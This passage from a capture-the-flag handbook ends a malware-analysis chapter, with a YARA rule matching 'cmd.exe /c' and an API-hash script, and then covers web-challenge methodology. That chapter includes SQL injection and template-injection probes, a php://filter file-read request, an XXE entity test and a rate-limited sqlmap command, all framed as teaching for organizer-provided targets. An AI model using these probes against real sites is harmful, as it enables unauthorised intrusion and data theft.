+Check `vol --help` for current plugin names. Symbol ZIPs are unavailable (Unapproved row 82). Suspicious executable private memory can suggest injection; JIT runtimes also legitimately create executable regions. Correlate contents, mapped files, threads, and process ancestry. `malfind` is a heuristic, not a complete detector.
+
+On approved **Windows x64dbg**, a justified runtime inspection belongs in an organizer-provided disposable analysis environment with network isolation. WSL, Wine, a timeout, or `strace` alone does not isolate malware from your files or network. Set breakpoints at allocation/decryption handoff, inspect the resulting buffer in the Dump view, and save only the relevant region for static analysis. Follow injection API chains as evidence; you do not need to reproduce injection against another process.
+
+For a permitted isolated Linux runtime, **Kali**:
+
+```bash
+strace -f -s 256 -e trace=network,file -o trace.log ./sample
+ltrace -f -o library-trace.log ./sample
+```
+
+These commands execute the sample. If that environment is absent, continue static/dump analysis. No dynamic execution is required merely because a sample contains an environment check.
+
+For raw shellcode, **WSL**:
+
+```bash
+objdump -D -b binary -m i386:x86-64 -M intel shellcode.bin
+```
+
+Set the correct architecture before interpreting output. A decoder loop's XOR/subtract operations wrap modulo 256: `((byte-0x32)&255) ^ key[i%len(key)]`. Preserve exact key bytes, including newlines. Junk push/pop sequences may alter flags or fault; confirm data/control dependencies before deleting them from an analysis model.
+
+<a id="09-malware--local-indicators-and-api-hashes"></a>
+
+## Local indicators and API hashes
+
+**Kali YARA**, row 164. Save as `case.yar`:
+
+```yara
+rule Case_Config_Lead {
+    strings:
+        $a = "challenge-marker" ascii wide
+        $b = "cmd.exe /c" ascii wide nocase
+    condition:
+        $a and $b
+}
+```
+
+```bash
+yara -s case.yar sample.bin
+yara -s case.yar memory.dmp
+```
+
+Replace `challenge-marker` with a distinctive recovered string. Broad “not MZ” rules match almost every non-PE file and are not useful evidence. Retain matching offsets for follow-up extraction.
+
+For API hashing, export names from relevant challenge DLLs and compute the **sample's** hash locally. A common ROR13-add hypothesis:
+
+```python
+from pathlib import Path
+def api_hash(name):
+    h=0
+    for c in name.encode('ascii'):
+        h=((h>>13)|(h<<19))&0xffffffff
+        h=(h+c)&0xffffffff
+    return h
+target=0x12345678  # comparison constant from the sample
+for name in Path('exports.txt').read_text().splitlines():
+    if api_hash(name)==target: print(name)
+```
+
+Check name casing, terminating NUL, DLL-name inclusion, and seed. Hash collisions require validating the resolved API's arguments/call sites. No online hash database is needed.
+
+Source material adapted: all five files in `ctf-malware/`. The useful manual decompiler/debugger reasoning from `tools-mcp.md` was retained; agent calls and unsupported debuggers were removed. Live bot access, ARP interception/RST injection, unapproved parser packages, and public sandbox uploads were excluded.
+
+
+---
+
+<a id="02-web-exploitation"></a>
+
+<a id="02-web-exploitation--web-exploitation-follow-the-request-to-the-trust-boundary"></a>
+
+# Web exploitation: follow the request to the trust boundary
+
+**Quick route:** [Short commands](#quickstart--web-paths) · [Tool strengths and weaknesses](#tool-chooser--web). Use this chapter for deeper explanations.
+
+Use this chapter for an organizer-provided web challenge. A successful probe changes one controlled input and explains one observable difference. Record the request, response, account, and prerequisite before trying a longer chain.
+
+The official event categories include Web. This chapter also retains useful web material from the repository's miscellaneous and historical notes. Historical payloads are hypotheses: the deployed language, library version, parser, and challenge source decide whether they apply.
+
+<a id="02-web-exploitation--where-the-commands-run"></a>
+
+## Where the commands run
+
+| Environment | Use here | Do not assume |
+|---|---|---|
+| Windows desktop | Chrome and its DevTools; approved editor | Native Python, curl, or Burp installation |
+| Windows WSL | Python 3, Burp Community, jq, OpenSSL; these are in the Windows approved sheet | ffuf, sqlmap, Node.js, or Burp extensions |
+| Organizer Kali | curl, ffuf, sqlmap, Git, ripgrep, Node.js and listed tools, after a version check | Every Windows-sheet tool is also installed; best-effort installations may fail |
+
+All `bash` blocks below run in WSL or Kali unless labelled **Kali only**. Start WSL from PowerShell with `wsl`; use `/mnt/c/...` for Windows files. Save Python blocks as the named `.py` file, then run `python3 filename.py`. Non-AI libraries can be added in either environment under PDF p.5; check [package setup and exclusions](#00-tool-rules--non-ai-python-package-checks). Examples use the standard library unless a dependency is named.
+
+Use Burp Community manually. The workbook rejects Copy As Python-Requests, GraphQL Raider, Hackvertor, and JWT Editor extensions. MCP automation, AI agents, public webhook services, and public challenge uploads are not part of this workflow.
+
+<a id="02-web-exploitation--1-establish-a-baseline-you-can-reproduce"></a>
+
+## 1. Establish a baseline you can reproduce
+
+1. Read the challenge description and supplied source. Write down the permitted host, port, and any separate bot or callback service.
+2. Open the application once in Chrome. Record the URL after redirects, page title, visible forms, and the account you used.
+3. In DevTools → Network, preserve the log and perform one normal action. Open the request's Headers, Payload, Response, and Cookies views.
+4. Look for route names and API calls in supplied JavaScript. Identify data the server trusts: user IDs, prices, filenames, URLs, template text, serialized objects, and roles.
+5. In Burp, start a temporary project, open Proxy → Open browser, and browse the challenge. If that GUI is unavailable on the WSL workstation, use Chrome DevTools and the Python request below.
+6. Send the interesting request from Proxy HTTP history to Repeater. Send it unchanged twice. Dynamic nonces and timestamps should be understood before interpreting length differences.
+
+Keep TLS verification enabled. If the organizer supplies a challenge CA, configure that CA in the client. A certificate failure is a connection problem, not a vulnerability signal.
+
+**Kali only**, replace the URL with the challenge URL:
+
+```bash
+curl --version
+curl --max-time 10 --dump-header baseline.headers --output baseline.body 'https://challenge.example/'
+```
+
+The two files contain response headers and body separately. This request does not follow redirects; read `Location` first. A `302` to login means the baseline is unauthenticated. A `429` means pause and obey `Retry-After`.
+
+**WSL/Kali Python alternative**, save as `fetch_once.py`:
+
+```python
+import sys
+import urllib.request
+import urllib.error
+from pathlib import Path
+
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        return None
+
+if len(sys.argv) != 2:
+    raise SystemExit('usage: python3 fetch_once.py https://CHALLENGE/path')
+opener = urllib.request.build_opener(NoRedirect)
+req = urllib.request.Request(sys.argv[1], headers={'User-Agent': 'CTF-manual/1.0'})
+try:
+    response = opener.open(req, timeout=10)
+except urllib.error.HTTPError as exc:
+    response = exc
+with response:
+    body = response.read(2_000_001)
+    if len(body) > 2_000_000:
+        raise SystemExit('response exceeds local review limit')
+    Path('baseline.body').write_bytes(body)
+    Path('baseline.headers').write_text(str(response.headers), encoding='utf-8')
+    print(response.status, len(body), response.headers.get('Location', ''))
+```
+
+Expected output is a status, byte count, and possibly a redirect. This script deliberately makes one request. Compare the saved body with what Chrome displays; JavaScript may fetch the actual data later.
+
+<a id="02-web-exploitation--2-build-a-small-route-and-parameter-map"></a>
+
+## 2. Build a small route and parameter map
+
+Use evidence already present in the application before guessing names. A linked `/api/profile`, source comment, JavaScript route, exposed source archive, or a challenge hint is a useful starting point.
+
+| Evidence | One next action | Interpretation |
+|---|---|---|
+| JavaScript calls `/api/items/17` | Replay the exact request | Learn the response structure and authentication |
+| An object contains `ownerId` | Compare objects belonging to two challenge accounts | Separate authentication from ownership checks |
+| Source uses a pathname parameter | Request one known permitted filename | Establish the file-read baseline |
+| Response has `Server`, framework cookies, or stack trace | Match against supplied dependency files | Headers alone do not prove a version |
+| `robots.txt` links a route | Open that listed route once | Disallowed crawling is not an access control |
+| Supplied `.git` directory | Inspect locally; do not clone unrelated organizations | Deleted challenge files may remain in history |
+
+**Kali only**, with a supplied repository:
+
+```bash
+git -C challenge-source log --oneline --all -20
+git -C challenge-source log --all --oneline -- config.py
+git -C challenge-source show COMMIT:config.py
+rg -n 'fetch\(|axios|/api/|SECRET|verify|unserialize|render_template_string' challenge-source
+```
+
+Replace `COMMIT` with a commit from the log. A hit is a lead; verify whether the running challenge uses that code. Do not print credentials into shared notes unnecessarily.
+
+If source reveals a route prefix and a short set of plausible names, make a small local list. **Kali only**:
+
+```bash
+printf '%s\n' profile export status > routes.txt
+ffuf -w routes.txt -u 'https://challenge.example/api/FUZZ' -t 1 -rate 1 -timeout 10 -maxtime 30 -mc all -of json -o routes.json
+```
+
+Run this only after recording why `/api/` and these three names are plausible. Inspect every response manually. A site may return `200` with the same error page for all paths. Stop on rate limiting or repeated server errors. Avoid recursive scans and large default dictionaries; this chapter does not use the repository's high-concurrency fuzzer.
+
+For a confirmed technique, the Kali workbook includes an offline PayloadsAllTheThings copy. Search its relevant chapter rather than downloading or spraying a bulk payload collection:
+
+```bash
+rg -n -i 'sqlite|union' '/opt/tools/PayloadsAllTheThings/SQL Injection'
+rg -n -i 'jinja|flask' '/opt/tools/PayloadsAllTheThings/Server Side Template Injection'
+```
+
+Read the nearby explanation and match its parser/version assumptions to your challenge. A missing directory is an environment limitation; the repository's automatic clone instructions are not needed.
+
+<a id="02-web-exploitation--3-repeater-as-the-main-experiment-notebook"></a>
+
+## 3. Repeater as the main experiment notebook
+
+Create tabs called `baseline`, `candidate`, and `negative-control`. Disable automatic redirect following while investigating login or access checks. Let Burp update `Content-Length` when you edit a body.
+
+Example request, with your own session cookie substituted:
+
+```http
+GET /api/notes/17 HTTP/1.1
+Host: challenge.example
+Cookie: session=YOUR_CHALLENGE_SESSION
+Accept: application/json
+
+```
+
+Change only `17` to the ID of an object made by your second challenge account. Compare status, body, owner, and whether a new `Set-Cookie` appears. A `200` with `{"error":"forbidden"}` is denied access; status alone is not proof.
+
+For a POST, preserve content type and CSRF handling:
+
+```http
+POST /api/profile HTTP/1.1
+Host: challenge.example
+Cookie: session=YOUR_CHALLENGE_SESSION
+Content-Type: application/json
+
+{"displayName":"ctf-marker-17"}
+```
+
+A CSRF token may be single-use or session-bound. If a replay fails, obtain a new normal request before blaming your changed field. Keep raw bytes: form data, JSON, multipart, URL percent encoding, and HTML entities are different decoding layers.
+
+<a id="02-web-exploitation--4-authentication-and-access-control"></a>
+
+## 4. Authentication and access control
+
+<a id="02-web-exploitation--ownership-and-mass-assignment"></a>
+
+### Ownership and mass assignment
+
+Use two accounts you control. Compare a request from each, then substitute an object identifier without changing the session. If the application accepts an extra `role`, `owner`, or `balance` field, verify the value with a separate read request. An echoed field can be ignored by the database.
+
+For WebSocket or server-sent events, connect normally, log out in another tab, then send one benign message on the existing connection. Acceptance after logout is evidence of stale authorization only if the operation actually needs a current session. Inspect the upgrade handshake and subsequent frames separately.
+
+<a id="02-web-exploitation--cookies-and-state"></a>
+
+### Cookies and state
+
+Record the cookie name, domain, path, Secure, HttpOnly, SameSite, and expiration. HttpOnly prevents JavaScript reading a cookie; it does not prevent a browser sending authenticated requests. Cookie `Path` is not an authorization mechanism. A base64-looking cookie may be signed, encrypted, or just encoded; decode a copy before changing it.
+
+Distinguish these observations:
+
+- Editing a role and receiving rejection suggests an integrity check.
+- Editing a role and seeing the old role suggests the server ignores the field.
+- Replaying an old signed balance after spending suggests state rollback; verify with a fresh balance query.
+- Receiving a session at a public admin-login route is normal unless that session already authorizes an admin action.
+
+<a id="02-web-exploitation--normalization-and-parser-disagreements"></a>
+
+### Normalization and parser disagreements
+
+When source compares strings differently from the framework, compare one encoded representation with its decoded equivalent: `/admin/item` versus `/%61dmin/item`, for example. Preserve the raw path in Burp. A browser may normalize it before transmission.
+
+Do not spray all encodings. First determine which component validates the input and which component uses it. Relevant source patterns include `startswith`, regex anchors, repeated URL decoding, `basename`, route middleware, Unicode case folding, and delimiter-based account records.
+
+For username normalization, create two ordinary test names that differ by case or a documented normalization rule. Confirm which account is returned. Do not assume provider-specific email alias handling is universal.
+
+<a id="02-web-exploitation--password-and-otp-hypotheses"></a>
+
+### Password and OTP hypotheses
+
+Do not start with a login brute force. First check whether the challenge supplies a small candidate space, source-generated passwords, a timestamp seed, or an offline verifier. Prefer testing candidates locally. One failed login with a known wrong password establishes the failure signature; a second known account establishes whether username enumeration exists.
+
+If an online candidate test is necessary, use a few challenge-derived candidates, one at a time, and stop on lockout or rate limiting. A redirect, response length, or missing error string alone does not establish login success; fetch the authenticated account page afterwards. Recreate any frontend password transform from the supplied JavaScript before testing.
+
+<a id="02-web-exploitation--5-jwt-and-jwe-inspect-before-changing"></a>
+
+## 5. JWT and JWE: inspect before changing
+
+JWT normally has three base64url segments. JWE compact serialization normally has five. Encryption with a public key does not authenticate who created the ciphertext; a challenge that accepts arbitrary encrypted claims may need an independent signature or server-side authorization check.
+
+Save this local decoder as `decode_token.py`. It does not verify signatures:
+
+```python
+import base64
+import json
+import sys
+
+def decode(segment):
+    return base64.urlsafe_b64decode(segment + '=' * (-len(segment) % 4))
+
+token = sys.argv[1]
+parts = token.split('.')
+print('segments:', len(parts))
+for i in ([0, 1] if len(parts) == 3 else [0]):
+    try:
+        print(i, json.dumps(json.loads(decode(parts[i])), indent=2))
+    except (ValueError, IndexError) as exc:
+        print('not a JSON segment:', i, exc)
+```
+
+```bash
+python3 decode_token.py 'PASTE_YOUR_CHALLENGE_TOKEN'
+```
+
+Look at `alg`, `kid`, `jku`, embedded `jwk`, issuer, audience, subject, expiration, and role. Do not conflate the identity claim with the authorization claim. Compare tokens from two accounts to understand which fields matter.
+
+If source omits signature verification, edit a harmless display claim and observe a separate authenticated page. If it explicitly accepts `alg: none`, the missing signature is the hypothesis. If it accepts both HMAC and RSA, check whether the same raw key bytes are mistakenly used for both; modern libraries often prevent this confusion.
+
+`kid` traversal requires a file-based key loader; `jku` injection requires the verifier to fetch an untrusted key URL. A header existing is not enough. Any URL used must be organizer-provided infrastructure, not a public JWKS or callback host.
+
+**Kali only:** `jwt_tool --help` can show the installed command's inspection syntax. Prefer the decoder above for transparent inspection. Do not assume the rejected JWT Editor Burp extension is available.
+
+<a id="02-web-exploitation--6-sql-injection-prove-the-expression-boundary"></a>
+
+## 6. SQL injection: prove the expression boundary
+
+Start from a parameter that plausibly reaches SQL and a stable baseline. Read source if supplied. Numeric, quoted string, identifier, and `ORDER BY` contexts require different syntax.
+
+Example numeric context, tested separately in Repeater:
+
+```http
+GET /item?id=1%20AND%201=1 HTTP/1.1
+Host: challenge.example
+
+```
+
+```http
+GET /item?id=1%20AND%201=2 HTTP/1.1
+Host: challenge.example
+
+```
+
+Expected evidence: the first response matches item 1, the second gives the application's normal no-result page, and the unchanged baseline remains stable. This pair does not work if input is parsed as an integer before querying; that failure narrows the hypothesis.
+
+For a single-quoted string, adapt to the actual query. A trailing SQL comment must be valid for the database, and MySQL's `--` comment requires following whitespace. Do not copy a payload from a different DBMS and treat its error as proof of a WAF.
+
+<a id="02-web-exploitation--visible-results"></a>
+
+### Visible results
+
+After a boolean difference is confirmed, find the projection width with a small number of `ORDER BY` or `UNION SELECT NULL` probes appropriate to the query. Use a unique marker in one compatible text column. Retrieve only the challenge-relevant table or row indicated by schema or source.
+
+Common failures are mismatched column counts, incompatible types, pagination hiding your row, and the original query returning before your injected row. Store each successful intermediate request.
+
+<a id="02-web-exploitation--blind-results"></a>
+
+### Blind results
+
+Define a reliable true/false predicate before extracting text. Check both outcomes several times. Measure lengths only after removing dynamic tokens. For timing, alternate true and false probes and compare repeated measurements; network jitter can exceed the intended delay. Avoid expensive expressions such as huge `randomblob` allocations.
+
+A local binary search rehearsal makes the extraction logic clear:
+
+```python
+# Save as oracle_search.py; this toy does not contact a server.
+secret = 73
+queries = 0
+def is_at_most(value):
+    global queries
+    queries += 1
+    return secret <= value
+
+lo, hi = 0, 255
+while lo < hi:
+    mid = (lo + hi) // 2
+    if is_at_most(mid):
+        hi = mid
+    else:
+        lo = mid + 1
+assert lo == secret
+assert queries <= 8
+print(lo, queries)
+```
+
+Expected output is `73 8`. The real oracle must answer the same mathematical predicate; mixing `>` and `>=` causes off-by-one failures. Determine string length and character encoding before iterating positions.
+
+<a id="02-web-exploitation--targeted-sqlmap-after-manual-confirmation"></a>
+
+### Targeted sqlmap after manual confirmation
+
+**Kali only:** save the confirmed request from Burp as `request.txt`, with its current session and token. Check that it points only at the challenge host.
+
+```bash
+sqlmap --version
+sqlmap -r request.txt -p id --level=1 --risk=1 --technique=B --threads=1 --delay=1 --timeout=10 --retries=0 --batch
+```
+
+This confines testing to the observed `id` parameter and boolean technique. Review detected DBMS and the exact injection evidence. A token-expiration error is not a negative SQLi result. Do not add `--dump-all`, OS shells, tamper chains, or unrelated parameters automatically. For TLS requests, preserve the correct target scheme when exporting or use the installed help's TLS option.
+
+<a id="02-web-exploitation--less-obvious-sql-input-paths"></a>
+
+### Less obvious SQL input paths
+
+| Pattern in source | Diagnostic | What to do after a positive result |
+|---|---|---|
+| Stored name used in a later query | Put a unique marker in the stored field; trigger the later view | Test the later query boundary, not only registration |
+| Sort key inserted unquoted | Compare a permitted column with a simple expression | Map identifier/expression context |
+| `INSERT` or duplicate-key update | Inspect all inserted columns and conflict handling | Track which field can shift or overwrite another |
+| Image metadata, QR, DNS answer, or header reaches SQL | Follow that exact data path with a marker | Capture decoded input before testing SQL syntax |
+| Escaping plus multibyte conversion | Identify charset and order of operations | Reproduce the conversion locally on bytes |
+| Two passes of formatting | Compare literal `%` and a benign format marker | Separate application formatting from SQL parsing |
+| Keyword replacement filter | Inspect whether replacement repeats | Model one transformation; do not assume comment fragmentation works |
+
+MySQL process-list tricks, historical `PROCEDURE ANALYSE`, backtracking limits, and column truncation are version- and configuration-dependent. Check the supplied schema and DBMS version; do not treat old writeup dates as applicability evidence.
+
+<a id="02-web-exploitation--7-nosql-ldap-xpath-and-graphql"></a>
+
+## 7. NoSQL, LDAP, XPath, and GraphQL
+
+JSON is not automatically safe. If a MongoDB query directly uses an input object, test whether a field accepts an operator-shaped value instead of a string. Compare a known account with a non-matching condition first. If validation rejects objects, pivot rather than spraying `$where` JavaScript.
+
+LDAP and XPath use different grammar from SQL. Locate a concatenated filter or XPath expression in source, then test one matching/non-matching predicate while preserving balanced syntax. A wildcard returning multiple directory records is an enumeration signal only if that endpoint was meant to return one.
+
+GraphQL inspection in Repeater needs no extension:
+
+```http
+POST /graphql HTTP/1.1
+Host: challenge.example
+Content-Type: application/json
+
+{"query":"{ __typename }"}
+```
+
+If this returns a JSON `data` object, consult the supplied schema or the application's own queries. Introspection may be disabled. Request a single known field before attempting nested queries or aliases. An alias changes the response key; it does not itself bypass access checks. Compare authorization for the same object through two resolvers.
+
+<a id="02-web-exploitation--8-file-reads-paths-and-uploads"></a>
+
+## 8. File reads, paths, and uploads
+
+Use a file already identified by the challenge source or description. A request for an arbitrary operating-system file may prove traversal, but the shortest useful proof is usually a challenge-specific configuration or marker.
+
+If `file=welcome.txt` is the normal input, try one relative traversal suggested by the source directory layout. Distinguish reading raw bytes, template inclusion, archive extraction, and executable upload: they are different capabilities.
+
+PHP `php://filter` is relevant only when a PHP stream function accepts a wrapper. In Repeater, a source-reading hypothesis might use:
+
+```http
+GET /view?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
+Host: challenge.example
+
+```
+
+Expected evidence is base64 that decodes to the application's PHP source. Decode locally and verify syntax and route names. A rendered login page or literal error string is not source disclosure. Wrapper restrictions, suffix appending, and include paths can invalidate the probe.
+
+For uploads, begin with a harmless text or image marker. Record original filename, multipart content type, saved filename, destination URL, and response content type. Check whether the file is renamed or re-encoded. Re-encoding destroys many appended polyglots.
+
+Archive traversal checks start with listing members, not extracting over your working tree:
+
+```python
+# Save as inspect_zip.py; run with the challenge ZIP path.
+import sys
+import zipfile
+from pathlib import PurePosixPath
+
+with zipfile.ZipFile(sys.argv[1]) as archive:
+    for item in archive.infolist():
+        p = PurePosixPath(item.filename.replace('\\', '/'))
+        mode = item.external_attr >> 16
+        unsafe = p.is_absolute() or '..' in p.parts or bool(p.parts and ':' in p.parts[0])
+        symlink = (mode & 0o170000) == 0o120000
+        print(item.filename, 'size=', item.file_size,
+              'traversal=', unsafe, 'symlink=', symlink)
+```
+
+A symlink member followed by a file through that link is a different risk from a `../` filename. Windows drive paths and separators need separate review. Challenge upload extraction may behave differently from your local ZIP library.
+
+Historical `.htaccess`, `.phar`, `zip://`, short-name, null-byte, and double-extension tricks need the matching server and language version. Prove how the stored file is handled before trying code execution.
+
+<a id="02-web-exploitation--9-template-format-string-and-command-injection"></a>
+
+## 9. Template, format-string, and command injection
+
+<a id="02-web-exploitation--template-arithmetic-first"></a>
+
+### Template arithmetic first
+
+For a field rendered by a template engine, submit `ctf-{{7*7}}-end` and compare it with a literal control. A response containing `ctf-49-end` suggests evaluation. It does not uniquely identify Jinja2; several engines use similar syntax.
+
+Read the stack trace, template source, or dependency file. Map the exact context: template source versus a variable passed to a fixed template, expression versus statement, and server-side versus client-side rendering. Then use the engine's documented syntax to inspect one harmless available value.
+
+Python `str.format` is not Jinja2 and does not evaluate arbitrary expressions. Its field traversal can still expose attributes or dictionary entries if sensitive objects are passed into the format operation. A literal `{7*7}` remaining unchanged is expected there.
+
+<a id="02-web-exploitation--command-and-argument-boundaries"></a>
+
+### Command and argument boundaries
+
+If source concatenates input into a shell command, a benign marker distinguishes command execution from validation. Adapt one separator to the proven shell context, for example a URL-encoded newline followed by `printf CTF_PROBE_17` in a challenge-controlled command parameter.
+
+Do not send a reverse shell as the first test. Determine whether output appears in the response, a generated file, or a challenge-provided log. If output is suppressed, a small bounded timing control can be tested repeatedly, but ordinary slowness is not sufficient evidence.
+
+An argument array can prevent shell parsing while still accepting dangerous program options. A filename beginning with `-` can be an option if the called program lacks `--`. Inspect the complete command construction, including archive, mail, Git, image metadata, and renderer subprocesses.
+
+Languages matter: Ruby `eval`, Perl two-argument `open`, Lisp reader macros, Prolog queries, Lua interpolation, PHP legacy evaluation functions, and LaTeX shell escapes have different entry points. Modern runtimes remove some historical features. Reproduce the input-to-evaluator transformation locally before constructing a longer payload.
+
+<a id="02-web-exploitation--10-ssrf-and-xml-identify-the-fetcher"></a>
+
+## 10. SSRF and XML: identify the fetcher
+
+An SSRF candidate is a URL or hostname that the server fetches. First use an organizer-provided callback or an allowed URL within the challenge. Compare a known reachable path with a known missing path. Record response status, fetched content, or callback logs. Do not use public webhook services or cloud metadata endpoints outside the assigned challenge.
+
+Write down the sequence:
+
+```text
+input bytes → URL parser → allowlist → DNS resolution → redirect handling → HTTP client
+```
+
+Parser disagreement only helps when the validator and fetcher disagree. Test one discrepancy supported by source: userinfo `@`, encoded path separators, host normalization, redirects, or an unanchored hostname regex. A fetch failure might be TLS, DNS, firewall, scheme restriction, or parsing; distinguish these using a normal URL.
+
+If the challenge explicitly includes an internal service, first request its harmless health or version endpoint. Docker APIs, Redis, SMTP, MySQL, and renderer attachments require protocol-specific behavior; HTTP SSRF alone does not imply arbitrary TCP access. A `gopher` string is useless if the actual client does not support that scheme.
+
+For XML, begin with an internal entity that expands to a marker:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE note [<!ENTITY probe "CTF_XML_MARKER">]>
+<note>&probe;</note>
+```
+
+If the parser expands it, inspect whether external entities are enabled. Internal expansion does not prove external file/network access. For a challenge that explicitly provides a marker file, the next entity may reference that exact file. Save parser errors: disabled DTDs, missing root elements, namespace requirements, and conversion pipelines change the behavior.
+
+Office documents, SVG, PDF renderers, XMLDecoder, XSLT, and SOAP can hide XML parsing inside uploads or conversions. Follow the actual conversion chain. Avoid publishing external DTDs; use only provided infrastructure where an out-of-band test is necessary and allowed.
+
+<a id="02-web-exploitation--11-deserialization-and-prototype-pollution"></a>
+
+## 11. Deserialization and prototype pollution
+
+Never deserialize an unknown challenge object in your normal working interpreter just to inspect it. Python pickle, marshal-derived code, Java objects, PHP magic methods, .NET polymorphic objects, and XML object decoders can invoke behavior.
+
+For a suspected pickle, disassemble bytes without loading objects:
+
+```bash
+python3 -m pickletools suspect.pickle
+```
+
+Look for `GLOBAL`, `STACK_GLOBAL`, `REDUCE`, object construction, and `STOP`. Decode any outer base64 or ROT13 layer into a new file first. A pickle stream may contain appended objects; the first `STOP` can hide data ignored by a simple loader.
+
+For other formats, identify the entry function and allowed classes from source. The repository's generic Java gadget-tool invocation is not an approved-tool assumption. A useful local proof can be a harmless object whose known hook writes a marker in the challenge sandbox, only after the matching class exists.
+
+Prototype pollution requires a controllable merge or path setter plus a reachable gadget. Send an inert property such as `ctfProbe`, inspect an independently created object in a supplied local reproduction, and determine whether the property is inherited. Do not infer code execution from accepting a `__proto__` key.
+
+**Kali only**, a local JavaScript distinction:
+
+```javascript
+// Save as prototype-demo.js, run: node prototype-demo.js
+const parsed = JSON.parse('{"__proto__":{"ctfProbe":17}}');
+console.log(Object.hasOwn(parsed, '__proto__')); // true
+console.log(({}).ctfProbe);                    // undefined
+```
+
+Parsing JSON alone does not pollute the global prototype. The vulnerable merge, inherited configuration lookup, and template/VM gadget must each be demonstrated. Node's `vm` and browser-like DOM packages have version-specific boundaries; old constructor chains are not universal escapes.
+
+<a id="02-web-exploitation--12-browser-side-execution-and-origin-boundaries"></a>
+
+## 12. Browser-side execution and origin boundaries
+
+<a id="02-web-exploitation--reflection-is-not-execution"></a>
+
+### Reflection is not execution
+
+Put `CTF_MARKER_17` into the suspected field. Find it in the response source and live DOM. Identify whether it appears in text, an attribute, a JavaScript string, a URL, CSS, or a template. Choose one benign context-appropriate proof that changes the document, such as setting a visible marker. Avoid cookie collection as a first test.
+
+Inspect CSP in both response headers and console errors. A policy blocking inline script may still permit an existing script gadget, but merely seeing a CDN domain is not proof of a bypass. `base-uri`, nonces, strict-dynamic, MIME type, and actual resource behavior matter.
+
+If a challenge supplies an admin bot, reproduce its browser actions manually: start URL, authentication state, allowed schemes, navigation steps, and timeout. A payload working in your privileged browser might fail in the bot's fresh session. Use only the challenge's report interface and provided callback endpoints.
+
+<a id="02-web-exploitation--dom-sources-and-sinks"></a>
+
+### DOM sources and sinks
+
+| Source or behavior | Inspect | Common failure |
+|---|---|---|
+| `location.hash` | jQuery selector or HTML insertion call | Modern selector handling differs from historical versions |
+| `postMessage` | Exact origin and source-window check | Checking only a substring or accepting `null` origin |
+| `window.open` / opener | Navigation and cross-window references | Cross-origin property access is restricted |
+| `Blob`, `data`, uploaded HTML | Resulting origin and MIME type | Opaque origins differ from normal same-origin pages |
+| DOM clobbering | Named elements used as global configuration | The expected property may be a string, not a node |
+| Client-side path construction | URL before and after normalization | Traversal may occur in the browser before the server |
+| CSS selectors or font loads | Which condition causes a resource request | Character-set leaks do not reveal order or count |
+
+Timing and XS-Leak tests require repeated positive/negative controls. Cache, fonts, network warmup, and bot startup are confounders. First demonstrate a one-bit distinction before attempting recovery of a longer value.
+
+Do not run obfuscated JavaScript from a challenge in your everyday browser context. Read its strings and transformations in the provided challenge context or an isolated local reproduction. JSFuck, AAEncode, and JJEncode are encodings/obfuscation patterns, not automatic evidence of malicious behavior or a particular exploit.
+
+<a id="02-web-exploitation--13-oauth-saml-cors-and-signatures"></a>
+
+## 13. OAuth, SAML, CORS, and signatures
+
+Capture a complete normal login flow using your challenge accounts. Record authorization URL, redirect URI, state, nonce, callback, issuer, audience, and resulting session. A callback parameter is not necessarily trusted simply because it is present.
+
+For state binding, initiate two flows in separate sessions and compare their callbacks. For email canonicalization, compare two controlled identities. For open redirects, use a harmless organizer-provided destination and verify the final browser URL. Do not register external provider accounts or take over public subdomains as part of this handbook.
+
+For SAML, inspect the supplied XML and verifier configuration. Determine which element is signed and which element supplies the identity. Signature-wrapping and digest-confusion hypotheses need that mismatch; a valid signature on an unrelated element proves nothing about the consumed assertion.
+
+CORS checks require a browser. A server reflecting an `Origin` header is not sufficient: check credentials, allowed methods, preflight, and whether JavaScript can read a sensitive response. `Access-Control-Allow-Origin: *` cannot authorize credentialed reads in the usual browser CORS model.
+
+For custom signatures, identify the construction exactly. `hash(secret || message)` may permit length extension for some hashes; HMAC is different. CRC is not a cryptographic authenticator. Base64 leniency plus duplicate parameters can cause two parsers to verify and consume different messages. See [Cryptography](#07-cryptography) for byte-level verification examples.
+
+<a id="02-web-exploitation--14-races-caches-and-protocol-parsing"></a>
+
+## 14. Races, caches, and protocol parsing
+
+Start race analysis from source showing a check and later update, or from a reproducible inconsistent result. Establish a sequential baseline, then attempt a pair of concurrent requests in the challenge only. Reset the challenge state if possible. A timeout is not a successful race, and widespread parallel retries obscure the cause.
+
+For cache behavior, use a unique cache-busting key and your own challenge object. Inspect `Age`, cache status, `Vary`, ETag, and whether authenticated and anonymous responses differ. A static-looking suffix can influence caching; the origin route may still return dynamic content. Do not poison shared unrelated pages.
+
+Request smuggling needs two HTTP parsers that disagree on request boundaries. Identify proxy and backend behavior from supplied configuration. Do not send ambiguous requests at the competition platform or shared infrastructure. In a dedicated local challenge reproduction, compare how each parser interprets length, transfer coding, headers, and connection reuse. Burp's displayed request is not proof of exact bytes sent over HTTP/2.
+
+HTTP method changes and header tricks require a route-specific hypothesis. TRACE, Range, forwarded host, and proxy headers do not inherently bypass authorization. A server error may be a parsing discrepancy; save the exact raw response before following a chain.
+
+<a id="02-web-exploitation--15-advanced-source-material-practical-starting-points"></a>
+
+## 15. Advanced source material: practical starting points
+
+| Source family | Start with | Constraint and next step |
+|---|---|---|
+| Framework CVEs, RSC/Flight, Next middleware | Supplied lockfile, route architecture, middleware behavior | Match affected version and configuration using the offline advisory; do not infer a CVE from branding |
+| Image/HTML/PDF renderer exploitation | Renderer name/version and one marker document | Observe whether content is fetched, embedded, or executed; avoid unapproved exploit generators |
+| Debugger consoles | Actual debug page and supplied deployment config | A PIN prompt is not authorization; determine the intended challenge path and secret derivation |
+| Serializer length changes | Before/after bytes and declared length fields | Reproduce expansion or truncation on a toy value before altering object structure |
+| Regex timing and backtracking | Pattern, input limit, fail-open handling | Use short timed controls; never send uncontrolled resource-exhaustion payloads |
+| Client HMAC or public-key encryption | Key origin and verification code | A client-visible symmetric secret cannot establish client trust; public encryption alone proves no sender identity |
+| WebAuthn replay | Challenge generation, session binding, expiration | Replay only your captured challenge response and verify the server's state transition |
+| Web3 contracts | Supplied source, ABI, storage layout, call authorization | Static review can expose delegatecall context, reentrancy order, signature replay, or unchecked calldata |
+| Solidity storage/compiler quirks | Exact compiler version and generated artifact | No online compiler; unlisted toolchains are not assumed approved. Use source and supplied bytecode or organizer clarification |
